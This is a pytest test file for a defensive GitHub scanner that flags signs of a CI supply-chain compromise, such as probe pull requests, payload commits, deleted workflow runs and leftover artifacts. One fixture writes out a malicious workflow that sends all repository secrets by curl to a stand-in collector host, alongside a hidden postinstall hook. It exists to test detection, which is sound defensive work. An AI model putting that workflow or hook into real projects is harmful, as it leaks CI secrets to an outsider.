"""asca github-check against a fake, offline GitHub API (shapes as returned by the REST API)."""
import os
import json
from urllib.parse import parse_qs, urlparse

import pytest

from asca import ghcheck
from asca.model import Severity

BASE = "https://api.github.com"
REPO = "alice/app"


class FakeGitHub:
    def __init__(self, routes: dict):
        self.routes = routes            # path -> body (list/dict/bytes) or (status, body)
        self.seen: list[str] = []

    def __call__(self, url, raw=False):
        assert url.startswith(BASE + "/")
        self.seen.append(url)
        u = urlparse(url)
        q = parse_qs(u.query)
        if int(q.get("page", ["1"])[0]) > 1:
            return 200, [], {}
        r = self.routes.get(u.path, (404, None))
        status, body = r if isinstance(r, tuple) else (200, r)
        return status, body, {}


def pr(n, title, head, state="open", created="2026-11-10T13:00:00Z", user="alice"):
    return {"number": n, "title": title, "state": state, "created_at": created, "head": {"ref": head},
            "user": {"login": user}, "html_url": f"https://github.com/{REPO}/pull/{n}"}


def commit(sha, msg, when="2026-11-11T10:00:00Z", login="alice"):
    return {"sha": sha, "commit": {"message": msg, "committer": {"date": when}, "author": {"name": login}},
            "author": {"login": login}, "html_url": f"https://github.com/{REPO}/commit/{sha}"}


def runs(*nums, wf=1, name="CI"):
    return {"total_count": len(nums), "workflow_runs": [{"workflow_id": wf, "name": name, "run_number": n}
                                                        for n in nums]}


def api_for(**routes):
    p = f"/repos/{REPO}"
    base = {f"{p}/pulls": [], f"{p}/commits": [], f"{p}/branches": [{"name": "main"}],
            f"{p}/actions/runs": runs(), f"{p}/actions/artifacts": {"total_count": 0, "artifacts": []},
            f"{p}/actions/caches": {"total_count": 0, "actions_caches": []}}
    base.update({f"{p}/{k}": v for k, v in routes.items()})
    fake = FakeGitHub(base)
    return ghcheck.Api("ghp_" + "x" * 36, fetch=fake), fake


def rules(fs):
    return sorted((f.rule, f.severity) for f in fs)


def test_clean_repo():
    api, fake = api_for()
    fs, notes = ghcheck.check_repo(api, REPO)
    assert fs == [] and notes == [] and ghcheck.verdict(fs) == "✅ clean"
    assert all(u.startswith(BASE) for u in fake.seen)


def test_probe_pr_alone_means_compromised():
    api, _ = api_for(pulls=[pr(2, "docs: dependency audit notes", "wfx-docs")])
    fs, _ = ghcheck.check_repo(api, REPO)
    assert rules(fs) == [("github.wfx-probe-pr", Severity.CRITICAL)]
    assert ghcheck.verdict(fs).startswith("🟥 probed")
    assert "compromised" in fs[0].detail


def test_old_or_unrelated_prs_ignored():
    api, _ = api_for(pulls=[pr(1, "docs: dependency audit notes", "wfx-docs", created="2026-10-01T00:00:00Z"),
                            pr(3, "docs: update readme", "docs")])
    assert ghcheck.check_repo(api, REPO)[0] == []


def test_payload_with_cleanup_is_critical_and_runs_gap_high():
    api, _ = api_for(commits=[commit("c3", "ci: cleanup"), commit("c2", "ci: restore"),
                              commit("c1", "chore: add ci helper\n\nbody")],
                     **{"actions/runs": runs(10, 11, 13, 14)})
    fs, _ = ghcheck.check_repo(api, REPO)
    assert ("github.wfx-payload-commit", Severity.CRITICAL) in rules(fs)
    gap = [f for f in fs if f.rule == "github.deleted-runs"][0]
    assert gap.severity == Severity.HIGH and "#12" in gap.title
    assert ghcheck.verdict(fs) == "🟥 payload pushed"


def test_generic_title_without_cleanup_is_medium():
    api, _ = api_for(commits=[commit("c1", "ci: refresh build cache")])
    fs, _ = ghcheck.check_repo(api, REPO)
    assert rules(fs) == [("github.wfx-payload-commit", Severity.MEDIUM)]
    assert "check the diff" in fs[0].detail


def test_gap_alone_is_low_and_contiguous_runs_fine():
    api, _ = api_for(**{"actions/runs": {"workflow_runs": runs(5, 6, 8)["workflow_runs"]
                                         + runs(1, 2, 3, wf=2, name="Docs")["workflow_runs"]}})
    fs, _ = ghcheck.check_repo(api, REPO)
    assert rules(fs) == [("github.deleted-runs", Severity.LOW)] and "#7" in fs[0].title
    assert ghcheck.verdict(fs) == "✅ clean"


def test_run_name_varies_per_run_same_workflow():
    rs = [{"workflow_id": 9, "name": f"PR #{n}", "path": ".github/workflows/ci.yml", "run_number": n} for n in (4, 5, 6)]
    api, _ = api_for(**{"actions/runs": {"workflow_runs": rs}})
    assert ghcheck.check_repo(api, REPO)[0] == []


def test_gap_next_to_probe_is_high():
    api, _ = api_for(pulls=[pr(2, "docs: dependency audit notes", "wfx-docs")], **{"actions/runs": runs(1, 3)})
    fs, _ = ghcheck.check_repo(api, REPO)
    assert ("github.deleted-runs", Severity.HIGH) in rules(fs)


@pytest.mark.parametrize("name,sev", [("wfx-docs", Severity.CRITICAL), ("chore/a1b2c3d4", Severity.MEDIUM),
                                      ("ci-check-1234", Severity.MEDIUM), ("chore/refactor", None),
                                      ("chore/deps", None), ("chore/a1b2c3d4e", None)])
def test_branch_names(name, sev):
    api, _ = api_for(branches=[{"name": "main"}, {"name": name}])
    fs, _ = ghcheck.check_repo(api, REPO)
    assert rules(fs) == ([("github.wfx-branch", sev)] if sev else [])


def test_loot_artifact_and_cache():
    api, _ = api_for(**{"actions/artifacts": {"total_count": 1}, "actions/caches": {"total_count": 2}})
    fs, _ = ghcheck.check_repo(api, REPO)
    assert rules(fs) == [("github.wfx-loot", Severity.CRITICAL)] * 2


def test_live_payload_on_default_branch_uses_offline_rules():
    pkg = json.dumps({"scripts": {"postinstall": 'sh ./.ci-dwgd2n.sh >/dev/null 2>&1'}}).encode()
    wf = (b"on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n"
          b"          S: \"${{ toJSON(secrets) }}\"\n        run: |\n"
          b"          echo \"$S\" | curl -s --data-binary @- https://collector.example.invalid/x\n")
    api, _ = api_for(**{"contents/package.json": pkg, "contents/.ci-dwgd2n.sh": b"true\n",
                        "contents/.github/workflows": [{"name": "ci.yml"}, {"name": "README.md"}],
                        "contents/.github/workflows/ci.yml": wf})
    fs, _ = ghcheck.check_repo(api, REPO)
    assert ("repo.wfx-indicator", Severity.CRITICAL) in rules(fs)
    assert ("repo.workflow-secret-dump", Severity.HIGH) in rules(fs)
    assert all("asca-ghcheck-" not in f.detail + f.location for f in fs)       # no temp paths leak
    assert ghcheck.verdict(fs) == "🟥 payload pushed"


def test_unreadable_repo_is_never_clean():
    api, _ = api_for(pulls=(404, None), commits=(404, None), **{"actions/runs": (404, None)})
    fs, notes = ghcheck.check_repo(api, REPO)
    assert fs == [] and ghcheck.verdict(fs, notes) == "❔ couldn't check"


def test_api_refuses_other_hosts():
    api = ghcheck.Api("ghp_" + "x" * 36)
    with pytest.raises(ValueError):
        api._fetch("https://evil.example/repos/x")


def test_run_lists_own_repos_and_reports(capsys, tmp_path):
    p = f"/repos/{REPO}"
    fake = FakeGitHub({"/user/repos": [{"full_name": REPO}], f"{p}/pulls": [pr(2, "x", "wfx-docs")],
                       f"{p}/commits": [], f"{p}/branches": [], f"{p}/actions/runs": (403, None)})
    api = ghcheck.Api("ghp_" + "x" * 36, fetch=fake)
    rc = ghcheck.run(["--state", str(tmp_path / "s.json")], api=api)
    out = capsys.readouterr().out
    assert rc == 1 and out.startswith("⛔ wfx: 1 of 1 repos") and "probed" in out
    assert "can't read Actions on 1 repo" in out
    assert "x" * 36 not in out


def test_telegram_change_only(monkeypatch, tmp_path):
    sent = []
    monkeypatch.setattr(ghcheck.report, "resolve_telegram", lambda *a: ("t", "c"))
    monkeypatch.setattr(ghcheck.report, "send_telegram", lambda text, **k: (sent.append(text), (True, "ok"))[1])
    p = f"/repos/{REPO}"

    def mk(prs):
        return ghcheck.Api("ghp_" + "x" * 36, fetch=FakeGitHub({f"{p}/pulls": prs, f"{p}/commits": [],
                                                                f"{p}/branches": [], f"{p}/actions/runs": runs()}))
    st = ["--repo", REPO, "--telegram", "change", "--state", str(tmp_path / "s.json")]
    assert ghcheck.run(st, api=mk([])) == 0 and sent == []                       # clean first run: silent
    assert ghcheck.run(st, api=mk([pr(2, "x", "wfx-docs")])) == 1 and len(sent) == 1
    assert ghcheck.run(st, api=mk([pr(2, "x", "wfx-docs")])) == 1 and len(sent) == 1   # unchanged: silent
    assert ghcheck.run(st, api=mk([])) == 0 and len(sent) == 2                   # recovery is reported once
    assert os.name == "nt" or (tmp_path / "s.json").stat().st_mode & 0o777 == 0o600
